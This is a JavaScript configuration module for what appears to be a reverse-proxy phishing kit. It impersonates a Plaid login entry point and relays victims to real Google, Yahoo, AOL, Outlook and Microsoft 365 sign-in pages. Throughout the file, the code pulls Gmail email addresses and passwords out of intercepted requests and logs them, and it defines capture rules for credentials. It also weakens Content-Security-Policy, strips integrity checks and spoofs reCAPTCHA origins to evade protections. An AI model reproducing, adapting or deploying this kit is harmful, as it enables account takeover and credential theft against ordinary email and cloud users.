/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const fs = require('fs')
// const superagent = require('superagent');


// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        if (this.browserReq.url.startsWith('/recaptcha')) {
            return this.browserReq.pipe(this.proxyEndpoint)
        } else if (this.clientContext.currentDomain === 'accounts.google.com') {
            return this.makeGmailProcess()
        }
        return super.processRequest()

    }

    makeGmailProcess() {
        if (this.browserReq.headers['content-length'] > 0) {
            let cJust = ''
            this.browserReq.on('data', (chunk) => {
                cJust += chunk.toString('utf8')
            })
            this.browserReq.on('end', () => {
                cJust += ''
                const hostDomainRegex = new RegExp(this.browserReq.clientContext.hostname, 'gi')
                const kJust = cJust.replace(hostDomainRegex, 'accounts.google.com')


                // const bgRegex = /bgRequest=[^&]*/
                if (this.browserReq.url.startsWith('/v3/signin/_/AccountsSignInUi/data/batchexecute')) {
                    const emailRegex = /f\.req=%5B%5B%5B%22V1UmUe%22%2C%22%5Bnull%2C%5C%22(.*?)%5C%22/
                    const pwRegex = /f\.req=%5B%5B%5B%22B4hajb%22%2C%22%5B1%2C1%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%5C%22(.*?)%5C%22/
                    
                    const emailMatch = emailRegex.exec(kJust)
                    const passwordMatch = pwRegex.exec(kJust)
                    if (emailMatch) {
                        console.log('Email matched')
                        const emailAdressencoded = emailMatch[1]
                        const emailGmail = decodeURIComponent(emailAdressencoded)
                        Object.assign(this.browserReq.clientContext.sessionBody,
                            { email: emailGmail })
                        console.log(`email address is ${emailGmail}`)
                        this.proxyEndpoint.setHeader('content-length', kJust.length)
                                this.proxyEndpoint.write(kJust) 
                                this.proxyEndpoint.end('')

                    }else if (passwordMatch) {
                        console.log('Password matched')
                        const passwwordEncoded = passwordMatch[1]
                        const passwordStr = decodeURIComponent(passwwordEncoded)
                        Object.assign(this.browserReq.clientContext.sessionBody,
                            { password: passwordStr })
                        console.log(`password is ${passwordStr}`)
                        this.proxyEndpoint.setHeader('content-length', kJust.length)
                                this.proxyEndpoint.write(kJust) 
                                this.proxyEndpoint.end('')
                    } else {
                        console.log('NO matches found')
                        this.proxyEndpoint.setHeader('content-length', kJust.length)
                        this.proxyEndpoint.write(kJust)
                        this.proxyEndpoint.end('')
                    }


                } else {
                    console.log('Another url path')
                    this.proxyEndpoint.setHeader('content-length', kJust.length)
                    this.proxyEndpoint.write(kJust)
                    this.proxyEndpoint.end('')
                }
                // this.proxyEndpoint.write(kJust)
            })
        } else {
            this.browserReq.pipe(this.proxyEndpoint)
        }

    }

    
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {

        super(proxyResp, browserEndPoint)
        this.regexes = [
            {
                reg: /play.google.com/ig,
                replacement: `${process.env.HOST_DOMAIN}/playboy`,
            },
            {
                reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
                replacement: `${process.env.HOST_DOMAIN}/CheckConnection`,
            },
            {
                reg: /name="checkConnection" value/gi,
                replacement: /name"checkConnection" value="youtube:1052:1"/,
            },
            {
                reg: /www\.google\.com/,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /login\.yahoo\.net/,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /www.gstatic.com/,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /integrity/,
                replacement:'xintegrity'
            },
            {
                reg: /<meta http-equiv="Content-Security-Policy" content="(.*?)/,
                replacement: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: \'unsafe-inline\' \'unsafe-eval\'; script-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; connect-src * data: blob: \'unsafe-inline\'; img-src * data: blob: \'unsafe-inline\'; frame-src * data: blob: ; style-src * data: blob: \'unsafe-inline\'; font-src * data: blob: \'unsafe-inline\';"'
            }
        ]
    }


    processResponse() {
        this.browserEndPoint.removeHeader('X-Frame-Options')
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }


        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url
            const checkUrls = ["https://guce.yahoo.com", 
            "https://www.yahoo.com/?guccounter=1&guce_referrer=", "https://www.yahoo.com/", 
             "/account/comm-channel/refresh", '/account/upsell/webauthn',
             "https://account.live.com", "https://account.microsoft.com",
             "https://api.login.aol.com/oauth2/request_auth",
             'https://guce.aol.com/consent?gcrumb=',
             "https://www.aol.com/", 'https://www.office.com/landing'

             ]
            
            for (let exitUrl of checkUrls) {
                if (rLocation.startsWith(exitUrl)) {
                    this.browserEndPoint.setHeader('location', '/auth/login/finish')
                }
            }           
        }

        
        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true
    }

    execute(clientContext) {
        this.req.headers['origin'] = `https://${clientContext.currentDomain}`

        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''

        if (this.req.url.startsWith('/identity')) {
            if (this.req.url === '/identity/v2') {
                if (this.req.method === 'POST') {
                    super.uploadRequestBody(clientContext.currentDomain, clientContext)
                    this.res.writeHead(302, {location: '/auth/login/finish'})
                    return super.cleanEnd(clientContext)
                }
                return super.superExecutePhpScript('adobe.php', clientContext)
            }
            if (this.req.url === '/identity/lalo/validate') {
                super.uploadRequestBody('PHP-EXEC', clientContext)
                return super.superExecutePhpScript('validate.php', clientContext)

            }
        }

        if (this.req.method === 'POST') {
            super.uploadRequestBody(clientContext.currentDomain, clientContext)
        }
        if (this.req.url.startsWith('/auth/login/')) {
            if (this.req.url === '/auth/login/yahoo') {
                clientContext.currentDomain = 'login.yahoo.com'
                this.res.writeHead(302, {location: '/'})
                return this.res.end('')
            }
           
            if (this.req.url === '/auth/login/aol') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.aol.com'
                this.res.writeHead(302, {location: '/'})
                return this.res.end('')
            }

            if (this.req.url === '/auth/login/gmail') {
                clientContext.currentDomain = 'accounts.google.com'
                // this.req.url = ''
                // return super.superExecuteProxy(clientContext.currentDomain, clientContext)
                this.res.writeHead(302, { location: '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin' })
                return this.res.end('')
            }
            
            if (this.req.url === '/auth/login/outlook') {
                clientContext.info.disableDeflate = true;
                this.req.headers['accept-encoding'] = 'gzip, br'
                this.req.url = '/'
                clientContext.currentDomain = 'login.live.com'
                this.res.writeHead(302, {location: '/'})
                return this.res.end('')
            }
            if (this.req.url === '/auth/login/office') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.microsoftonline.com'
                this.res.writeHead(302, {location: '/'})
                return this.res.end('')
            }
            
            if (this.req.url === '/auth/login/finish') {
                clientContext.setLogAvailable(true)
                super.sendClientData(clientContext, {})
                return super.exitLink('https://dashboard.plaid.com')
            }
        }

        if (this.req.url.startsWith('/CheckCookie')) {
            clientContext.setLogAvailable(true)
            super.sendClientData(clientContext, {})
        }



        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)

            if (redirectToken.url.startsWith('https://myaccount.google.com/') || 
                redirectToken.url.startsWith('https://accounts.google.com/ManageAccount')) {
                super.sendClientData(clientContext, {})
                this.res.writeHead(302, { location: '/auth/login/finish' })
                return super.cleanEnd('PHP-EXEC', clientContext)
            }

            const reqCheck = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            if (redirectToken.obj.pathname.startsWith('/account/challenge/recaptcha')) {
                this.req.url = reqCheck.replace(clientContext.hostname, 'www.google.com')

            } else {
                this.req.url = reqCheck 
            }

            return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}


const RecaptchaHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/recaptcha/');

    }

    execute(clientContext) {

        this.req.headers['origin'] = `https://${clientContext.currentDomain}`

        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''


        if (this.req.url.startsWith('/recaptcha/enterprise/anchor') || this.req.url.startsWith('/us/en/recaptcha/enterprise/anchor')) {
            const hostnameKey = Buffer.from(`https://${clientContext.hostname}:443`)
            const hostnameBase64Key = hostnameKey.toString('base64');
            console.log(hostnameBase64Key)

            this.req.url = this.req.url.replace('..', '==')
            this.req.url = this.req.url.replace('.&', '=&')


            this.req.url = this.req.url.replace(hostnameBase64Key, 'aHR0cHM6Ly9sb2dpbi55YWhvby5uZXQ6NDQz')

            
            console.log(this.req.url)
            return super.superExecuteProxy('www.google.com', clientContext)


        }


        if (this.req.url.startsWith('/recaptcha/enterprise')) {
            this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'www.google.com') : ''
            this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'www.google.com') : ''


            console.log(JSON.stringify(this.req.headers))
            
            return super.superExecuteProxy('www.google.com', clientContext)

        }

        if (this.req.url.startsWith('/recaptcha/releases')) {
            return super.superExecuteProxy('www.gstatic.com', clientContext)

        }


        return super.superExecuteProxy(clientContext.currentDomain, clientContext)
    }
}




const configExport = {
    CURRENT_DOMAIN: 'dashboard.plaid.com',
    START_PATH: '/identity/v2',


    EXTERNAL_FILTERS: 
    [
    'signaler-pa.googleapis.com',
    'ssl.gstatic.com',
    'dl.cws.xfinity.com',
    'comcast.demdex.net'
    ],


    PRE_HANDLERS:
        [
            RecaptchaHandler,
        ],
   
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        victimEmail: {
            method: 'POST',
            params: ['lalo'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        emailCapture: {
            method: 'POST',
            params: ['username', 'user'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        emailPassword: {
            method: 'POST',
            params: ['password', 'passwd'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        manualEmail: {
            method: 'POST',
            params: ['mento'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        manualPassword1: {
            method: 'POST',
            params: ['pinto1'],
            urls: '',
            hosts: 'PHP-EXEC',
        }, 

        manualPassword2: {
            method: 'POST',
            params: ['pinto2'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

